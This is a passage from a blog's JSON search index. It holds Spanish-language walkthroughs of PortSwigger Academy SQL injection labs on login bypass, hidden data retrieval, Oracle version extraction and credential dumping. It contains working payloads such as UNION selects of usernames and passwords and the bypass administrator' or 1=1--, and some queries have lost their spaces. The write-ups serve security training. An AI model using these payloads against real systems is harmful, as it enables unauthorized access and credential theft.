-:\nPets\u0026#39; union select null,username||\u0026#39;-\u0026#39;||password from users--   Laboratorio\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n   ","date":"2021-11-04T00:00:00Z","image":"https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-6/head_huc76dcbe4719eea5620ad72b9e0798e52_74880_120x120_fill_box_smart1_3.png","permalink":"https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-6/","title":"Portswigger Academy Learning Path: SQL Injection Lab 6"},{"content":"Lab: SQL injection attack, querying the database type and version on Oracle En este laboratorio1la finalidad es poder extraer la version de Oracle especificamente algo sobre este string Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production, PL/SQL Release 11.2.0.2.0 - Production, CORE 11.2.0.2.0 Production, TNS for Linux: Version 11.2.0.2.0 - Production, NLSRTL Version 11.2.0.2.0 - Production\nReconocimiento Ya que sabemos que el gestor es Oracle, se utilizaran payloads de Oracle y la manera de extraer los datos es muy diferente, siguiendo los pasos anteriores tocara enumerar columnas\nPayloads Detectar columnas Pets\u0026#39; order by 1-- Pets\u0026#39;orderby2-- Pets\u0026#39; order by 3-- //Genera error Detectar string Por lo que se ve al imprimir datos es que las dos columnas recuperan datos string, no es necesario hacer la prueba pero siempre hacerlo cuando se dude. En este caso Oracle como se nota no se puede enviar un select sin el valor from, ya que es algo propio de Oracle que es una tabla especial.\nPets\u0026#39; union select \u0026#39;test\u0026#39;,\u0026#39;test\u0026#39; from DUAL-- Recuperar version Ahora recuperar la version, las consultas utilizadas para esto en Oracle son las siguientes:\nSELECTbannerFROMv$versionSELECTversionFROMv$instanceLa inyeccion quedaria de la siguiente manera:\nPets\u0026#39; union SELECT banner,null FROM v$version-- Pets\u0026#39;unionSELECTversion,nullFROMv$instance--  Laboratorio resuelto \nCon esto ya muestra que se ha resuelto el lab.\n  Laboratorio\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n   ","date":"2021-11-04T00:00:00Z","image":"https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-7/head_huc76dcbe4719eea5620ad72b9e0798e52_74880_120x120_fill_box_smart1_3.png","permalink":"https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-7/","title":"Portswigger Academy Learning Path: SQL Injection Lab 7"},{"content":"Lab: SQL injection vulnerability allowing login bypass En este laboratorio se pretende explotar un SQL Injection, esta vez es un inicio de sesion, y se intentara explotar como en el laboratorio 1 en el cual se tiene que tratar de hacer un bypass para que el sistema no valide el resto que seria la contrasena. La consulta que hara seguramente sera:\nSELECT*FROMusersWHEREusername=\u0026#39;usuario\u0026#39;ANDpassword=\u0026#39;contrasena\u0026#39;Reconocimiento Se tratara de hacer que el sistema ya no invalide la contrasena que es enviada en la peticion, todo esto comentando lo que le sigue, de esta manera:\nSELECT*FROMusersWHEREusername=\u0026#39;usuario\u0026#39;--\u0026#39; AND password = \u0026#39;contrasena\u0026#39; De esta manera solo valida al usuario y la contrasena se mantiene comentada.\nExplotacion En este caso hay que hacerse con el usuario administrator del sistema, asi que se procede a realizar la siguiente inyeccion:\nadministrator' or 1=1--\n Payload inyectado en usuario \nque quedaria asi al ejecutar la consulta:\nSELECT*FROMusersWHEREusername=\u0026#39;administrator\u0026#39;or1=1--\u0026#39; AND password = \u0026#39;contrasena\u0026#39; Finalmente hemos resuelto el lab:\n Login Bypass \nTambien hubiera sido posible utilizar una lista1para realizar un ataque con intruder pero esta vez no fue necesario ya que el bypass es basico, pero se podria intentar.\n  Lista de payloads bypass login\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n   ","date":"2021-11-02T00:00:00Z","image":"https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-2/headlab2_huc76dcbe4719eea5620ad72b9e0798e52_74880_120x120_fill_box_smart1_3.png","permalink":"https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-2/","title":"Portswigger Academy Learning Path: SQL Injection Lab 2"},{"content":"Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data Este laboratorio contiene una vulnerabilidad de SQL Injection y la manera de resolverlo es que haga un ataque de SQL y que muestra los detalles de todos los productos en cualquier categoria, tanto released como unreleased.\nNos regalan una pista y se nos dice que el sistema realiza la siguiente consulta SQL\nSELECT*FROMproductsWHEREcategory=\u0026#39;Gifts\u0026#39;ANDreleased=1Reconocimiento Como lo explica en la lectura del laboratorio, la aplicacion recupera datos de la categoria Gifts y que solo se muestre los datos que tengan released como valor 1.\nPayloads He probado los siguientes payloads para saber si podria mostrar el resto de productos que no esta mostrando anteriormente.\n   Payload Accion     Gifts'\u0026ndash; Muestra solo 1 producto mas   Gifts'\u0026ndash; - Muestra solo 1 producto master   Gifts' and released = 0\u0026ndash; Muestra solo 1 producto    Explotacion Al notar como hace la validacion nos podemos dar cuenta que podriamos bypassear esa instruccion, recordando a la forma en que se hace un bypass a un login. Creando la siguiente consulta a inyectar quedaria: SQL\nGifts' or 1=1--\nPara que al final al inyectar la consulta SQL quedaria: SQL\nSELECT*FROMproductsWHEREcategory=\u0026#39;Gifts\u0026#39;or1=1-- AND released = 1 Haciendo que despues de -- se comente lo que le sigue y solo se ejecute lo primero. Adicionalmente no existe solo ese payload, se puede hacer uso de otros como la siguiente lista1Y por el tamano de la salida nos podemos dar cuenta que arroja muchos datos, aunque un payload no sea aceptado se puede hacer uso de otros.\n Ataque con intruder \n  Lista de payloads bypass login\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n   ","date":"2021-11-01T00:00:00Z","image":"https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-1/head_huc76dcbe4719eea5620ad72b9e0798e52_74880_120x120_fill_box_smart1_3.png","permalink":"https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-1/","title":"Portswigger Academy Learning Path: SQL Injection Lab 1"}]